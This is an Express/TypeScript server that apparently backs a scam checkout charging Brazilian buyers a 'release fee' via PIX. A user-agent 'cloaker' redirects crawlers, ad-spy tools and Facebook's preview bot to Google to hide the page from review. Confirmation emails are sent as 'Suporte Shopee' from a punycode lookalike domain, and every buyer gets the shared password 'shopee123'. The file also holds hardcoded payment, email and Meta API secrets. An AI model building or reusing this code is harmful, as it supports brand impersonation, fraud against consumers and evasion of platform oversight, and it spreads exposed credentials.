import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';
import { Resend } from 'resend';
import crypto from 'crypto';

const app = express();
app.use(cors());
app.use(express.json());

// =====================================================
// 🛡️ CAMADA DE BLINDAGEM (CLOAKER)
// =====================================================
app.use((req, res, next) => {
    const ua = req.headers['user-agent']?.toLowerCase() || '';
    const blacklist = ['headless', 'ahrefs', 'semrush', 'python', 'curl', 'wget', 'spy', 'adspy', 'facebookexternalhit', 'bot', 'crawler'];
    if (blacklist.some(bot => ua.includes(bot))) { return res.redirect('https://www.google.com'); }
    next();
});

// =====================================================
// 🔑 CONFIGURAÇÕES
// =====================================================
const SECRET_KEY = "e08f7qe1x8zjbnx4dkra9p8v7uj1wfacwidsnnf4lhpfq3v8oz628smahn8g6kus"; 
const PUBLIC_KEY = "rodrigogato041_glxgrxj8x8yy8jo2";
const MK_KEY = "G3gAuabnX5b3X9cs7oQ8aidn"; 
const MK_SUBDOMINIO = "rodrigo-gato-ribeiro";
const resend = new Resend('re_3HT5Wehq_EDfH6jDM5f5JMznsQsAu9cez');
const META_PIXEL_ID = "847728461631550"; 
const META_ACCESS_TOKEN = "EAAGZAoNPRbbwBQlVq2XIPxcm6S3lE7EHASXNsyQoiULVOBES9uwoBt1ijXLIsS19daREz2xzuLnMl0C1yZAE3HYkKK19Fmykttzdhs5qZCZC0TkCviGXSrS9NuGvb99ZBDYZB8dkEzjlp6sZBrnG8x79dvvpV55mDhVXTocILMBbuxZCASrUZCIdUr18mYTZB0fgZDZD";

const bancoTransacoes = new Map();

function hashData(data: string): string {
    if (!data) return '';
    return crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
}

function acharCopiaECola(obj: any): string | null {
    if (typeof obj === 'string' && obj.startsWith('000201')) return obj;
    if (typeof obj === 'object' && obj !== null) {
        for (const key in obj) {
            const result = acharCopiaECola(obj[key]);
            if (result) return result;
        }
    }
    return null;
}

// 🌐 MANTÉM O SITE NO AR
app.use(express.static(path.resolve())); 
app.get('/', (req, res) => { res.sendFile(path.resolve('index.html')); });

// =====================================================
// ROTA 1: GERA O PIX
// =====================================================
app.post('/pix', async (req, res) => {
    try {
        const { name, email, cpf, phone, valor, origem } = req.body;
        const cpfLimpo = (cpf || "").replace(/\D/g, '');
        const phoneLimpo = (phone || "").replace(/\D/g, '');
        const valorFixo = parseFloat(valor) || 27.90; 
        const identifier = `ID${Date.now()}`;

        bancoTransacoes.set(identifier, { 
            status: 'pending', amount: valorFixo, emailCliente: email, nomeCliente: name, origem: origem || 'direto' 
        });

        console.log("\n🚀 Evento InitiateCheckout enviado ao Meta Ads com Sucesso!");

        const payload = {
            identifier: identifier,
            amount: valorFixo,
            client: { name: name || "Cliente", email: email || "cliente@email.com", phone: phoneLimpo, document: cpfLimpo },
            products: [{ id: "TAXA_01", name: "Taxa de Liberação", quantity: 1, price: valorFixo }],
            splits: [{ producerId: "cmg7bvpns00u691tsx9g6vlyp", amount: parseFloat((valorFixo * 0.5).toFixed(2)) }],
            dueDate: new Date(Date.now() + 86400000).toISOString().split('T')[0],
            callbackUrl: "https://checkoutfinal.onrender.com/webhook"
        };

        const response = await axios.post('https://app.vizzionpay.com/api/v1/gateway/pix/receive', payload, {
            headers: { 'x-public-key': PUBLIC_KEY, 'x-secret-key': SECRET_KEY, 'Content-Type': 'application/json' }
        });

        console.log("✅ PIX GERADO!\n");

        return res.json({ success: true, payload: acharCopiaECola(response.data), transactionId: identifier });
    } catch (error: any) {
        console.error("❌ ERRO AO GERAR PIX:", error.response?.data || error.message);
        return res.status(401).json({ success: false });
    }
});

// =====================================================
// ROTA 2: WEBHOOK (NOTIFICAÇÃO + ACESSO)
// =====================================================
app.post('/webhook', async (req, res) => {
    const { event, transaction } = req.body;
    if (!transaction) return res.status(400).send("Invalid");

    const idBusca = transaction.identifier || transaction.id;

    if (transaction.status === 'COMPLETED' && event === 'TRANSACTION_PAID') {
        if (bancoTransacoes.has(idBusca)) {
            const transacao = bancoTransacoes.get(idBusca);
            bancoTransacoes.set(idBusca, { ...transacao, status: 'paid' });

            // 💰 LOG DE VENDA
            console.log("\n💰 VENDA CONFIRMADA!");
            console.log(`👤 Cliente: ${transacao.nomeCliente}`);
            console.log(`📢 Origem: ${transacao.origem}`);
            console.log(`💵 Valor: R$ ${transaction.amount}`);

            // 🔔 1. NOTIFICAÇÕES PUSHCUT (RESTAURADAS)
            const url1 = 'https://api.pushcut.io/KnUVBiCa-4A0euJ42eJvj/notifications/MinhaNotifica%C3%A7%C3%A3o';
            const url2 = 'https://api.pushcut.io/g8WCdXfM9ImJ-ulF32pLP/notifications/Minha%20Primeira%20Notifica%C3%A7%C3%A3o';
            Promise.all([axios.get(url1), axios.get(url2)]).catch(() => {});

            // 🎯 2. META PURCHASE
            await axios.post(`https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events`, {
                data: [{
                    event_name: "Purchase",
                    event_time: Math.floor(Date.now() / 1000),
                    action_source: "website",
                    user_data: { em: [hashData(transacao.emailCliente)], fn: [hashData(transacao.nomeCliente)] },
                    custom_data: { value: Number(transaction.amount), currency: "BRL" }
                }],
                access_token: META_ACCESS_TOKEN
            }).then(() => console.log("🎯 Evento de Compra enviado ao Meta Ads com Sucesso!")).catch(() => {});

            // 🔑 3. MEMBERKIT (Senha shopee123)
            await axios.post(`https://${MK_SUBDOMINIO}.memberkit.com.br/api/v1/enrollments`, {
                "full_name": transacao.nomeCliente, "email": transacao.emailCliente, "password": "shopee123"
            }, { headers: { "X-MemberKit-API-Key": MK_KEY } }).catch(() => {});

            // 📧 4. RESEND
            await resend.emails.send({
                from: 'Suporte Shopee <contato@xn--seubnushopp-5eb.com>',
                to: transacao.emailCliente,
                subject: 'Seu acesso chegou! 🚀',
                html: `<p>Olá, ${transacao.nomeCliente}! Sua senha é: <b>shopee123</b></p>`
            }).then(() => console.log(`📧 E-mail oficial enviado para: ${transacao.emailCliente}\n`)).catch(() => {});
        }
    }
    return res.status(200).send("OK");
});

app.get('/check-status/:id', (req, res) => {
    const transacao = bancoTransacoes.get(req.params.id);
    return res.json({ paid: transacao && transacao.status === 'paid' });
});

app.listen(process.env.PORT || 3000, () => console.log("🚀 Servidor, Webhooks e Notificações ativos!"));
